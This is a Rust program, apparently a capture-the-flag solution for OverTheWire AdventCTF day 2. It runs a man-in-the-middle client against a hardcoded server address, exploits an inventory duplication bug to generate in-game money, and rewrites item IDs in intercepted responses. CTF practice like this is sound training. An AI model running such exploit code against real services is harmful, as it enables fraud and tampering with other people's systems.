extern crate clap;
extern crate day2;

use clap::{App, Arg};
use day2::protos::AdventMessages::{Action, Response};
use day2::MitmClient;
use log::{info, trace};
use protobuf::{parse_from_bytes, Message};
use std::cmp;
use std::error::Error;
use std::fs::File;
use std::io;
use std::io::Read;

fn exploit(mitm: &mut MitmClient) -> Result<(), Box<dyn Error>> {
    // {{{ messages setup

    // with this message we tell the server to retrieve the first item from
    // the stash, and to store the first item of the inventory at the same time
    let mut msg_dup = Action::new();
    msg_dup.mut_inventory().set_retrieve_buy(1); // 1 == retrieve
    msg_dup.mut_inventory().set_store_sell(1); // 1 == store
    // this line is not useful since the inventory_id field will be 0 by default.
    // msg_dup.mut_inventory().set_inventory_id(0);

    // pop the first item of the stash
    let mut msg_pop = Action::new();
    msg_pop.mut_inventory().set_retrieve_buy(1); // 1 == retrieve

    // sell second item of the inventory
    let mut msg_sell = Action::new();
    msg_sell.mut_inventory().set_store_sell(2);
    msg_sell.mut_inventory().set_inventory_id(1);
    // }}}

    let mut n = 0;
    let stash_size = 31;

    // first we send dup msgs in order to fill te stash
    while n < stash_size {
        mitm.server.send_message(&msg_dup)?;
        n += 1;
    }

    // Then we retrieve duplicated items 5 by 5 and sell them :)
    // We only retrieve 5 / 6 items because We need to always have one item in
    // the inventory and one in the stash for the duplication to work.
    n += 1;
    while n > 0 {
        let mut inv_size = 0;

        // pop items 5 by 5
        let min_size = cmp::min(n, 5);
        while inv_size < min_size {
            inv_size += 1;
            mitm.server.send_message(&msg_pop)?;
        }

        // sell items 5 by 5
        while inv_size > 0 {
            mitm.server.send_message(&msg_sell)?;
            inv_size -= 1;
            n -= 1;
        }
    }

    Ok(())
}

fn exploit_loop(
    mitm: &mut MitmClient,
    username: &str,
    password: &str,
) -> Result<(), Box<dyn Error>> {
    let mut msg_login = Action::new();
    msg_login.mut_login().set_username(username.to_string());
    msg_login.mut_login().set_password(password.to_string());

    // store second item in stash
    let mut msg_store = Action::new();
    msg_store.mut_inventory().set_store_sell(1);
    msg_store.mut_inventory().set_inventory_id(1);

    // buy second item from shop
    // once an item is bought it is removed
    let mut msg_buy = Action::new();
    msg_buy.mut_inventory().set_retrieve_buy(2);
    msg_buy.mut_inventory().set_inventory_id(1);

    // first step, let's login
    mitm.server.send_message(&msg_login)?;
    info!("logged in as username:{} password:{}", username, password);

    // store the second item (the club)
    // inventory: [potion]
    // stash: [club]
    mitm.server.send_message(&msg_store)?;

    info!("initial duplication exploit");
    exploit(mitm)?;

    let dup_num = 6;
    for i in 1..dup_num {
        info!("[{}/{}] duplication exploit on new shop item", i, dup_num);
        // buy second item from shop
        mitm.server.send_message(&msg_buy)?;

        // place it in stash
        let mut msg_store = Action::new();
        msg_store.mut_inventory().set_store_sell(1);
        msg_store.mut_inventory().set_inventory_id(1);
        mitm.server.send_message(&msg_store)?;

        // make more money by duplicating the new item
        exploit(mitm)?;
    }

    info!("all done, enjoy the money :=)");

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let matches = App::new("adventctf day2")
        .version("1.0")
        .about("solves the overthewire adventctf day2")
        .subcommand(
            App::new("exploit")
                .about("exploits the duplication bug")
                .version("1.0")
                .arg(Arg::with_name("username").required(true))
                .arg(Arg::with_name("password").required(true)),
        )
        .get_matches();

    // init logging
    let base_config = fern::Dispatch::new();

    let stdout_config = fern::Dispatch::new()
        .format(|out, message, record| {
            out.finish(format_args!(
                "[{}][{}][{}] {}",
                chrono::Local::now().format("%H:%M"),
                record.target(),
                record.level(),
                message
            ))
        })
        .chain(io::stdout());

    base_config.chain(stdout_config).apply()?;

    let mut stream_file = File::open("stream.dat")?;
    let mut cipher_key = Vec::new();
    stream_file.read_to_end(&mut cipher_key)?;

    let mut mitm = MitmClient::new("3.93.128.89:12021", "3.93.128.89:12022", &cipher_key)?;

    if let Some(ref sub) = matches.subcommand_matches("exploit") {
        let username = sub.value_of("username").unwrap();
        let password = sub.value_of("password").unwrap();

        exploit_loop(&mut mitm, username, password)?;
    } else {
        // hook messages sent to the client
        // if it's a Retrieve Response, change the id of the item
        mitm.client.hook_write(|raw_msg| {
            hexdump::hexdump(&raw_msg);
            match parse_from_bytes::<Response>(&raw_msg) {
                Ok(mut x) => {
                    if x.get_retrieve().get_inventory().get_items().len() > 0
                        && x.get_retrieve().get_inventory().get_items()[0].get_id() == 6
                    {
                        trace!("Retrieve hook called");
                        x.mut_retrieve().mut_inventory().mut_items()[0].set_id(7);
                        return x.write_to_bytes().unwrap();
                    }
                    return raw_msg;
                }
                Err(_) => {
                    return raw_msg;
                }
            }
        });

        mitm.run()?;
    }

    Ok(())
}
